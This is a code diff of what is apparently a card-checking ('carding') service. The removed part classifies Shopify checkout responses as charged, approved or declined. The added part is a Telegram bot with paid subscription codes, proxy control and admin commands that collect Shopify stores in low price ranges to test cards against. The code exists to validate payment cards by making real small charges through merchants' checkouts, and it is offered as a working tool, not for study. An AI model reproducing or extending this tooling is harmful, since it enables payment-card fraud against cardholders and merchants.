-                "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD",
-                "PAYMENTS_CREDIT_CARD_BASE_LOST_CARD",
-                "PAYMENTS_CREDIT_CARD_BASE_FRAUDULENT",
-                "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE",
-                "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR",
-                "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD",
-                "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER",
-                "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY",
-                "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER",
-                "GENERIC_ERROR",
-            }
-            _site_skip_codes = {
-                "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP",
-                "PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE",
-                "PAYMENTS_INVALID_GATEWAY_FOR_DEVELOPMENT_STORE",
-                "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
-                "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE",
-                "REQUIRED_ARTIFACTS_UNAVAILABLE",
-            }
+async def start(event):
 
-            approval_hits = [c for c in error_codes if c in _approval_codes]
-            decline_hits = [c for c in error_codes if c in _decline_codes or c.startswith("PAYMENTS_CREDIT_CARD_BASE_")]
-            site_hits = [c for c in error_codes if c in _site_skip_codes]
+    try:
 
-            if approval_hits:
-                _steps.append(f"7. Result: APPROVED | code={approval_hits[0]}")
-                return {"status": "Approved", "message": "Card approved by gateway", "error_code": approval_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
-            if decline_hits:
-                _steps.append(f"7. Result: DECLINED | code={decline_hits[0]}")
-                return {"status": "Declined", "message": "Card declined", "error_code": decline_hits[0], "product": product_title, "price": price, "raw_receipt": {"errors": error_codes, "__typename": completion.get("__typename", "SubmitAlreadyAccepted")}, "debug_steps": _steps}
-            if site_hits:
-                _steps.append(f"7. Result: SITE_ERROR | codes={error_codes}")
-                return {"status": "Error", "message": ", ".join(error_codes), "error_code": "SITE_INCOMPATIBLE", "product": product_title, "price": price, "debug_steps": _steps}
+        uid = event.sender_id
+        is_new = await db["users"].find_one({"user_id": uid}) is None
+        await ensure_user(uid)
+        await update_last_seen(uid)
+        user = await db["users"].find_one({"user_id": uid})
+        
+        if is_new:
+            sender = await event.get_sender()
+            first_name = sender.first_name or "Unknown"
+            last_name = sender.last_name or ""
+            username = f"@{sender.username}" if sender.username else "No Username"
+            admin_msg = f"""🆕 <b>{bs('NEW USER')}</b> 🆕
+<b>━━━━━━━━━━━━━━━━━</b>
+👤 <b>{bs('Name')}:</b> <code>{first_name} {last_name}</code>
+🆔 <b>{bs('ID')}:</b> <code>{uid}</code>
+🔗 <b>{bs('User')}:</b> {username}
+<b>━━━━━━━━━━━━━━━━━</b>
+𝗗𝗲𝘃 → sonik"""
+            for admin_id in ADMIN_ID:
+                try:
+                    await client.send_message(admin_id, admin_msg, parse_mode='html')
+                except:
+                    pass
+        if not await force_join_check(event): return
 
-            _steps.append(f"7. Result: ERROR | codes={error_codes}")
-            return {"status": "Error", "message": ", ".join(error_codes), "product": product_title, "price": price, "debug_steps": _steps}
-        receipt = completion.get("receipt")
-        if not receipt:
-            tn = completion.get("__typename", "?")
-            reason = completion.get("reason", "")
-            errs = completion.get("errors") or []
-            if tn == "CheckpointDenied":
-                _redirect_url = completion.get("redirectUrl") or checkout_page_url
-                return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "_checkout_url": _redirect_url}
-            if tn in ("Throttled", "TooManyRequests"):
-                return {"status": "Error", "message": "Throttled by Shopify", "error_code": "THROTTLED", "product": product_title, "price": price}
-            if verbose:
-                keys = list(completion.keys())
-                _log_verbose(verbose, f"No receipt | typename={tn} | keys={keys} | reason={reason!r} | errors={errs[:2] if errs else []}", discord_webhook=discord_console_webhook)
+        if await is_banned_user(uid):
+
+            t, e = banned_user_message()
+
+            return await styled_reply(event, t, emoji_ids=e)
+
+        
+
+        sub = await get_user_subscription(uid)
+
+        user_name = (await event.get_sender()).first_name or "User"
+
+        access_type = "OWNER" if uid in ADMIN_ID else (sub["plan"].upper() if sub["is_active"] else "TRIAL")
+
+        credits = "Unlimited" if uid in ADMIN_ID else "250"
+
+        joined_date = user.get("created_at", datetime.now()).strftime("%Y-%m-%d") if user else datetime.now().strftime("%Y-%m-%d")
+
+        
+
+        text_raw = f"""{gemj('fire_premium')} <b>{bs('User')}:</b> <i>{user_name}</i> 🃏
+{gemj('heart_fire')} <b>{bs('User ID')}:</b> <code>{uid}</code>
+{gemj('diamond')} <b>{bs('Access')}:</b> <b>{access_type}</b>
+{gemj('wine')} <b>{bs('Credits')}:</b> <code>{credits}</code>
+{gemj('snowman')} <b>{bs('Joined')}:</b> <code>{joined_date}</code>
+<b>━━━━━━━━━━━━━━━━━</b>
+𝗗𝗲𝘃 → sonik"""
+
+        kb = [
+            [
+                Button.inline(f"⚡️ {bs('CHECKER MENU')}", data="menu_checker", style="success"), 
+                Button.inline(f"💎 {bs('SITES CONTROL')}", data="menu_sites", style="success")
+            ],
+            [
+                Button.inline(f"🛷 {bs('PROXY CONTROL')}", data="menu_proxy", style="danger"), 
+                Button.inline(f"🆒 {bs('MY ACCOUNT')}", data="menu_account", style="danger")
+            ],
+            [
+                Button.inline(f"☃️ {bs('ADMIN PANEL')}", data="menu_admin", style="primary")
+            ],
+            [
+                Button.url(f"🥂 {bs('UPGRADE TO PREMIUM')}", url=f"https://t.me/{PAYMENT_BOT_USERNAME}", style="success")
+            ],
+            [
+                Button.url(f"❤️‍🔥 {bs('OFFICIAL CHANNEL')}", url="https://t.me/ReGict7", style="primary"), 
+                Button.url(f"🆒 {bs('SUPPORT')}", url="https://t.me/ISoonik", style="primary")
+            ]
+        ]
+        
+        # Attempt to send with custom emojis first
+        caption_text, entities = build_entities(text_raw)
+        video_link = "https://t.me/Joker73336/7"
+        
+        try:
+            # Try 1: Video + Premium Emojis
+            await client.send_file(event.chat_id, video_link, caption=caption_text, formatting_entities=entities, buttons=kb)
+        except:
+            try:
+                # Try 2: Video + Plain HTML (No Premium Emojis) - This usually works if IDs are invalid
+                await client.send_file(event.chat_id, video_link, caption=text_raw, parse_mode='html', buttons=kb)
+            except:
+                # Try 3: Text + Premium Emojis
+                try:
+                    await client.send_message(event.chat_id, caption_text, formatting_entities=entities, buttons=kb, link_preview=False)
+                except:
+                    # Try 4: Plain Text only
+                    clean_text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text_raw)
+                    await client.send_message(event.chat_id, clean_text, buttons=kb, parse_mode='html', link_preview=False)
+    except Exception as e:
+        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")
+
+
+
+@client.on(events.CallbackQuery(data=b"check_joined"))
+
+async def check_joined_cb(event):
+
+    uid = event.sender_id
+
+    if uid in ADMIN_ID:
+
+        return await event.answer(f"✅ {bs('Admin')}!")
+
+    if await is_user_joined(uid):
+
+        await event.answer(f"✅ {bs('Verified')}!", alert=True)
+
+        try:
+
+            await event.delete()
+
+        except:
+
+            pass
+
+        await styled_send(event.chat_id, f"⚡ <b>{bs('Welcome to Sonik')}</b> ⚡\n📝 <code>/start</code> <b>{bs('for commands')}</b>", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
+
+    else:
+
+        await event.answer(f"❌ {bs('Not joined')}!", alert=True)
+
+
+
+# ====================== CODE COMMANDS ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]code\b'))
+
+async def generate_code_cmd(event):
+
+    """Admin command to generate subscription codes"""
+
+    if event.sender_id not in ADMIN_ID:
+
+        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
+
+    
+
+    if await check_maintenance(event):
+
+        return
+
+    
+
+    parts = event.raw_text.split()
+
+    if len(parts) < 2:
+
+        return await styled_reply(event, f"""🎁 <b>{bs('Generate Code')}</b> 🎁
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/code hours</code>
+
+💡 <i>{bs('Example: /code 24')}</i>
+
+⏳ <i>{bs('Generates a code for 24 hours subscription')}</i>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⏰ <b>{bs('Codes expire in')}:</b> <code>{CODE_EXPIRY_HOURS}h</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"]])
+
+    
+
+    try:
+
+        hours = int(parts[1])
+
+        if hours <= 0:
+
+            return await styled_reply(event, f"⚠️ <b>{bs('Hours must be positive')}</b>", emoji_ids=[CE["cross"]])
+
+        
+
+        code = await create_subscription_code(event.sender_id, hours)
+
+        
+
+        await styled_reply(event, f"""🎁 <b>{bs('Code Generated')}</b> 🎁
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🔑 <b>{bs('Code')}:</b> <code>{code}</code>
+
+⏰ <b>{bs('Hours')}:</b> <code>{hours}h</code>
+
+⏳ <b>{bs('Expires In')}:</b> <code>{CODE_EXPIRY_HOURS}h</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+💡 <i>{bs('Share this code with users')}</i>
+
+📝 <i>{bs('They can use: /redeem CODE')}</i>""", emoji_ids=[CE["gift"], CE["gift"], CE["star"], CE["gem"], CE["info"]])
+
+        
+
+    except ValueError:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Invalid hours')}</b>", emoji_ids=[CE["cross"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
+
+async def redeem_code_cmd(event):
+
+    """User command to redeem a subscription code - FIXED timezone issue"""
+
+    if await check_maintenance(event):
+
+        return
+
+    
+
+    if not await force_join_check(event):
+
+        return
+
+    
+
+    uid = event.sender_id
+
+    
+
+    # Check if user is banned
+
+    if await is_banned_user(uid):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    
+
+    # Parse command
+
+    parts = event.raw_text.split()
+
+    if len(parts) < 2:
+
+        return await styled_reply(event, f"""🎁 <b>{bs('Redeem Code')}</b> 🎁
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/redeem CODE</code>
+
+💡 <i>{bs('Example: /redeem ABC12345')}</i>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+💡 <i>{bs('Enter the code you received from admin')}</i>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"]])
+
+    
+
+    code = parts[1].strip().upper()
+
+    
+
+    try:
+
+        # Check if code exists and is valid
+
+        code_data = await db["codes"].find_one({"code": code})
+
+        
+
+        if not code_data:
+
+            return await styled_reply(event, f"""🚫 <b>{bs('Invalid Code')}</b> 🚫
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+❌ <b>{bs('The code does not exist')}</b>
+
+💡 <i>{bs('Please check and try again')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
+
+        
+
+        if code_data.get("used", False):
+
+            return await styled_reply(event, f"""🚫 <b>{bs('Code Already Used')}</b> 🚫
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+❌ <b>{bs('This code has already been redeemed')}</b>
+
+💡 <i>{bs('Used by another user')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
+
+        
+
+        # FIX: Handle timezone properly
+
+        expires_at = code_data.get("expires_at")
+
+        if expires_at:
+
+            # If expires_at is naive, make it aware
+
+            if expires_at.tzinfo is None:
+
+                expires_at = expires_at.replace(tzinfo=timezone.utc)
+
+            # Compare with current time (which is timezone-aware)
+
+            if expires_at < datetime.now(timezone.utc):
+
+                return await styled_reply(event, f"""⏰ <b>{bs('Code Expired')}</b> ⏰
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+❌ <b>{bs('This code has expired')}</b>
+
+💡 <i>{bs('Please contact admin for a new code')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
+
+        
+
+        # Admin users cannot redeem codes (they already have access)
+
+        if uid in ADMIN_ID:
+
+            return await styled_reply(event, f"""👑 <b>{bs('Admin Access')}</b> 👑
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ <b>{bs('You are an admin')}</b>
+
+💡 <i>{bs('Admins already have full access')}</i>
+
+💡 <i>{bs('Use /give to give subscriptions to users')}</i>""", emoji_ids=[CE["crown"], CE["crown"], CE["info"]])
+
+        
+
+        # Check if user already has active subscription
+
+        if await is_user_subscribed(uid):
+
+            return await styled_reply(event, f"""✅ <b>{bs('Already Subscribed')}</b> ✅
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ <b>{bs('You already have an active subscription')}</b>
+
+⏳ <i>{bs('Wait for your subscription to expire')}</i>""", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
+
+        
+
+        # Redeem the code
+
+        result = await redeem_code(uid, code)
+
+        
+
+        if result["success"]:
+
+            # Notify admins
+
+            try:
+
+                sender = await event.get_sender()
+
+                name = sender.first_name or "User"
+
+                for admin in ADMIN_ID:
+
+                    await styled_send(admin, f"""✅ <b>Code Redeemed!</b>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+👤 <b>User:</b> <code>{uid}</code>
+
+📛 <b>Name:</b> {name}
+
+🔑 <b>Code:</b> <code>{code}</code>
+
+⏰ <b>Hours:</b> <code>{result['hours']}h</code>
+
+⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""", emoji_ids=[CE["check"], CE["gift"]])
+
+            except:
+
+                pass
+
+            
+
+            await styled_reply(event, f"""🎉 <b>{bs('Code Redeemed Successfully!')}</b> 🎉
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ <b>{bs('Subscription Added')}</b>
+
+⏰ <b>{bs('Hours')}:</b> <code>{result['hours']}h</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+💡 <i>{bs('You can now use all bot features')}</i>
+
+📝 <code>/start</code> {bs('to see commands')}""", emoji_ids=[CE["gift"], CE["gift"], CE["check"], CE["star"], CE["info"]])
+
+        else:
+
+            await styled_reply(event, f"""🚫 <b>{bs('Failed to Redeem')}</b> 🚫
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+❌ <b>{bs('Error')}:</b> <code>{result['message']}</code>
+
+💡 <i>{bs('Please try again or contact admin')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
+
+            
+
+    except Exception as e:
+
+        log_user(uid, "REDEEM_ERROR", f"Error: {e}", "error")
+
+        await styled_reply(event, f"""⚠️ <b>{bs('Error')}</b> ⚠️
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+❌ <b>{bs('An error occurred')}</b>
+
+📝 <code>{str(e)[:100]}</code>
+
+💡 <i>{bs('Please try again or contact admin')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]codes$'))
+
+async def list_codes_cmd(event):
+
+    """Admin command to list all codes"""
+
+    if event.sender_id not in ADMIN_ID:
+
+        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
+
+    
+
+    try:
+
+        codes = await db["codes"].find().sort("created_at", -1).to_list(length=50)
+
+        
+
+        if not codes:
+
+            return await styled_reply(event, f"📋 <b>{bs('No codes found')}</b>\n🎁 <code>/code hours</code> {bs('to generate')}", emoji_ids=[CE["warn"]])
+
+        
+
+        text = f"""📋 <b>{bs('Recent Codes')}</b> ({len(codes)}) 📋
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+"""
+
+        
+
+        for code_data in codes[:20]:
+
+            code = code_data.get('code', '?')
+
+            hours = code_data.get('hours', '?')
+
+            used = "✅" if code_data.get('used', False) else "⬜"
+
+            created_by = code_data.get('created_by', '?')
+
+            expires = code_data.get('expires_at')
+
+            if expires:
+
+                expires_str = expires.strftime('%m-%d %H:%M')
+
             else:
-                _log_verbose(verbose, f"No receipt (typename={tn})", discord_webhook=discord_console_webhook)
-            return {"status": "Error", "message": f"No receipt ({tn})", "product": product_title, "price": price, "debug_steps": _steps}
-        receipt_id = receipt.get("id")
-        if receipt.get("__typename") == "ProcessingReceipt":
-            poll_delay = 0.25
-            for poll_i in range(8):
-                await asyncio.sleep(min(poll_delay + poll_i * 0.06, 0.7))
-                poll_r = await _retry_async_request(session.post, graphql_url, headers=graphql_headers, json={"query": "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}", "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"}, retries=5, delay=0.5)
-                if poll_r.status_code != 200:
-                    continue
-                poll_data = poll_r.json()
-                rec = poll_data.get("data", {}).get("receipt", {})
-                if rec.get("__typename") == "ProcessedReceipt" or rec.get("orderIdentity"):
-                    _steps.append(f"7. Receipt: CHARGED | order={rec.get('orderIdentity', {}).get('id', 'N/A')}")
-                    return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
-                if rec.get("__typename") == "ActionRequiredReceipt":
-                    _steps.append("7. Receipt: 3DS_REQUIRED (Approved)")
-                    return {"status": "Approved", "message": "3DS Required", "error_code": "3DS_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
-                if rec.get("__typename") == "FailedReceipt":
-                    err = rec.get("processingError", {}) or {}
-                    code = err.get("code", "UNKNOWN")
-                    msg_orig = err.get("messageUntranslated", "") or err.get("message", "")
-                    if verbose:
-                        _log_verbose(verbose, f"FailedReceipt: code={code} messageUntranslated={msg_orig!r}", discord_webhook=discord_console_webhook)
-                    
-                    if code == "CAPTCHA_REQUIRED":
-                        _steps.append(f"7. Receipt: CAPTCHA_REQUIRED")
-                        return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
-                    
-                    approval_codes = {"INSUFFICIENT_FUNDS", "INVALID_CVC", "EXPIRED_CARD", "INCORRECT_CVC"}
-                    
-                    if code in approval_codes or "INSUFFICIENT" in code or "CVC" in code or "CVV" in code:
-                        _steps.append(f"7. Receipt: APPROVED | code={code} | msg={msg_orig}")
-                        return {"status": "Approved", "message": "Card approved by gateway", "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
-                    
-                    _steps.append(f"7. Receipt: DECLINED | code={code} | msg={msg_orig}")
-                    return {"status": "Declined", "message": "Card declined", "error_code": code, "gateway_message": msg_orig or None, "product": product_title, "price": price, "raw_receipt": rec, "debug_steps": _steps}
-            return {"status": "Error", "message": "Poll timeout", "product": product_title, "price": price, "debug_steps": _steps}
-    msg = "Submit failed"
-    if last_graphql_errors:
-        first = last_graphql_errors[0] if last_graphql_errors else {}
-        gql_msg = first.get("message") or first.get("messageUntranslated") or str(first)[:120]
-        msg = f"Submit failed: {gql_msg}"
-    elif last_completion:
-        tn = last_completion.get("__typename", "")
-        if tn == "CheckpointDenied":
-            _steps.append("7. Result: CAPTCHA_REQUIRED")
-            return {"status": "Error", "message": "CAPTCHA Required", "error_code": "CAPTCHA_REQUIRED", "product": product_title, "price": price, "debug_steps": _steps, "_checkout_url": checkout_page_url}
-        elif tn == "SubmitFailed" and last_completion.get("reason"):
-            msg = f"Submit failed: {last_completion.get('reason', '')}"
-        elif tn == "SubmitRejected" and last_completion.get("errors"):
-            codes = [e.get("code") for e in last_completion["errors"] if e.get("code")]
-            if codes:
-                msg = f"Submit failed: {', '.join(codes)}"
-        elif tn == "Throttled":
-            msg = "Submit failed: Throttled"
-        elif tn == "HttpError":
-            msg = f"Submit failed: HTTP {last_completion.get('status', '?')}"
-    _steps.append(f"7. Result: ERROR | {msg}")
-    return {"status": "Error", "message": msg, "product": product_title, "price": price, "debug_steps": _steps}
+
+                expires_str = '?'
+
+            
+
+            text += f"🔑 {used} <code>{code}</code> ━ {hours}h ━ {expires_str}\n"
+
+        
+
+        if len(codes) > 20:
+
+            text += f"\n<i>+{len(codes)-20} more</i>"
+
+        
+
+        text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n✅ Used | ⬜ Available"
+
+        
+
+        await styled_reply(event, text, emoji_ids=[CE["fire"], CE["fire"], CE["gift"]])
+
+    except Exception as e:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
 
 
-def _print_banner():
-    print("="*50)
-    print("  Shopify Checker - shopifyapi")
-    print("="*50)
+
+# ====================== SITE MANAGEMENT ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
+
+async def add_site(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    try:
+
+        sites_list = []
+
+        if event.is_reply:
+
+            rm = await event.get_reply_message()
+
+            if rm and rm.file:
+
+                fp = await rm.download_media()
+
+                try:
+
+                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
+
+                        content = await f.read()
+
+                        sites_list = extract_urls_from_text(content)
+
+                finally:
+
+                    try:
+
+                        os.remove(fp)
+
+                    except:
+
+                        pass
+
+            elif rm and rm.text:
+
+                sites_list = extract_urls_from_text(rm.text)
+
+        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
+
+        if add_text:
+
+            sites_list.extend(extract_urls_from_text(add_text))
+
+        if not sites_list:
+
+            return await styled_reply(event, f"""➕ <b>{bs('Add Site')}</b> ➕
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/add site.com</code>
+
+💡 <i>{bs('Or reply to a .txt file')}</i>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ <i>{bs('Only accepted responses:')}</i>
+
+📝 <i>3DS_REQUIRED | INSUFFICIENT_FUNDS | CARD_DECLINED | ORDER_PAID | CHARGED | PAYMENT_SUCCESSFUL</i>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
+
+        sites_list = list(dict.fromkeys(sites_list))
+
+        existing_sites = await get_global_sites()
+
+        existing_norm = {normalize_site_url(s) for s in existing_sites}
+
+        new_sites = []
+
+        already_exists = []
+
+        for site in sites_list:
+
+            norm = normalize_site_url(site)
+
+            if norm in existing_norm:
+
+                already_exists.append(norm)
+
+            else:
+
+                new_sites.append(norm)
+
+        if not new_sites:
+
+            return await styled_reply(event, f"⚠️ <b>{bs('All sites already exist')}</b> ⚠️\n📋 <b>{bs('Duplicates')}:</b> <code>{len(already_exists)}</code>", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
+
+        PENDING_ADD_SITES[event.sender_id] = {"sites": new_sites, "exists": already_exists, "event": event}
+
+        kb = [
+
+            [pbtn(f"💰 {bs('0.01-5 USD')}", f"add_price_range:1:{event.sender_id}"), pbtn(f"💰 {bs('0.01-10 USD')}", f"add_price_range:2:{event.sender_id}")],
+            [pbtn(f"💰 {bs('0.01-20 USD')}", f"add_price_range:3:{event.sender_id}"), pbtn(f"💰 {bs('0.01-40 USD')}", f"add_price_range:4:{event.sender_id}")],
+            [pbtn(f"💰 {bs('5-10 USD')}", f"add_price_range:5:{event.sender_id}"), pbtn(f"💰 {bs('5-20 USD')}", f"add_price_range:6:{event.sender_id}")],
+
+            [pbtn(f"💰 {bs('10-20 USD')}", f"add_price_range:7:{event.sender_id}"), pbtn(f"💰 {bs('20-40 USD')}", f"add_price_range:8:{event.sender_id}")],
+
+        ]
+
+        await styled_reply(event, f"""💰 <b>{bs('Select Price Range')}</b> 💰
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+➕ <b>{bs('New Sites')}:</b> <code>{len(new_sites)}</code>
+
+📋 <b>{bs('Already Exist')}:</b> <code>{len(already_exists)}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ <i>{bs('Only working sites with accepted responses')}</i>
+
+💰 <i>{bs('Sites with price above range will be excluded')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
+
+
+
+    except Exception as e:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
+
+
+
+@client.on(events.CallbackQuery(pattern=rb"add_price_range:(\d+):(\d+)"))
+
+async def add_price_range_cb(event):
+
+    range_id = int(event.pattern_match.group(1).decode())
+
+    admin_id = int(event.pattern_match.group(2).decode())
+
+    if event.sender_id != admin_id:
+
+        return await event.answer(f"🚫 {bs('Not for you')}!", alert=True)
+
+    data = PENDING_ADD_SITES.pop(admin_id, None)
+
+    if not data:
+
+        return await event.answer(f"⏰ {bs('Expired')}!", alert=True)
+
+    price_range = PRICE_RANGES.get(str(range_id), PRICE_RANGES["1"])
+
+    await event.answer(f"🔍 {bs('Testing sites...')}!")
+
+    try:
+
+        await event.delete()
+
+    except:
+
+        pass
+
+    asyncio.create_task(_process_add_sites_with_filter(data["event"], data["sites"], data["exists"], price_range))
+
+
+
+async def _process_add_sites_with_filter(event, new_sites, already_exists, price_range):
+
+    uid = event.sender_id
+
+    total = len(new_sites)
+
+    tested = 0
+
+    working = 0
+
+    dead = 0
+
+    added = 0
+
+    price_filtered = 0
+
+    rejected_gateway = 0
+
+    proxies = await get_all_user_proxies(uid)
+
+    user_site_sem = get_user_sem(uid, "site")
+
+    http_session = await get_user_http_session(uid, "site")
+
+    sm = await styled_reply(event, f"🔍 <b>{bs('Testing')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
+
+    
+
+    async def test_and_add(site):
+
+        nonlocal tested, working, dead, added, price_filtered, rejected_gateway
+
+        async with user_site_sem:
+
+            try:
+
+                res = await verify_site_full(site, random.choice(proxies) if proxies else None, http_session=http_session)
+
+                tested += 1
+
+                
+
+                if res['status'] == 'rejected':
+
+                    rejected_gateway += 1
+
+                    log_user(uid, "SITE_REJECTED", f"{site} - {res['reason']}")
+
+                elif res['status'] == 'alive':
+
+                    working += 1
+
+                    price_val = res.get('price_val', 999)
+
+                    if price_val <= price_range["max"] and price_val >= price_range["min"]:
+
+                        if await add_global_site(site):
+
+                            added += 1
+
+                    else:
+
+                        price_filtered += 1
+
+                else:
+
+                    dead += 1
+
+                
+
+                if tested % 10 == 0 or tested == total:
+
+                    try:
+
+                        await styled_edit(sm, f"🔍 <b>{bs('Testing')}...</b> {tested}/{total} | ✅{working} ❌{dead} | 🚫{rejected_gateway} | ➕{added} | 💰{price_filtered}", emoji_ids=[CE["fire"]])
+
+                    except:
+
+                        pass
+
+            except:
+
+                dead += 1
+
+                tested += 1
+
+    
+
+    for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
+
+        await asyncio.gather(*[asyncio.create_task(test_and_add(s)) for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
+
+    
+
+    await styled_edit(sm, f"""✅ <b>{bs('Add Sites Complete')}</b> ✅
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🔍 <b>{bs('Tested')}:</b> <code>{tested}</code>
+
+✅ <b>{bs('Working')}:</b> <code>{working}</code>
+
+❌ <b>{bs('Dead')}:</b> <code>{dead}</code>
+
+🚫 <b>{bs('Rejected (Dead/Error/Invalid Response)')}:</b> <code>{rejected_gateway}</code>
+
+💰 <b>{bs('Price Filtered')}:</b> <code>{price_filtered}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+➕ <b>{bs('Added')} (${price_range['min']}-${price_range['max']}):</b> <code>{added}</code>
+
+📋 <b>{bs('Already Existed')}:</b> <code>{len(already_exists)}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ <i>{bs('Only working sites with accepted responses are added')}</i>""", emoji_ids=[CE["check"], CE["check"], CE["globe"], CE["fire"], CE["cross"], CE["chart"], CE["warn"], CE["info"]])
+
+    
+
+    await cleanup_user_http_session(uid, "site")
+
+    cleanup_user_sem(uid)
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
+
+async def remove_site(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    rt = re.sub(r'^[/.]rm\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
+
+    if rt.lower() == 'all':
+
+        c = await clear_all_global_sites()
+
+        return await styled_reply(event, f"✅ <b>{bs('Removed')} {c} {bs('sites')}</b>", emoji_ids=[CE["check"]])
+
+    if not rt:
+
+        return await styled_reply(event, f"📝 <code>/rm site.com</code> {bs('or')} <code>/rm all</code>", emoji_ids=[CE["info"]])
+
+    to_rm = extract_urls_from_text(rt)
+
+    if not to_rm:
+
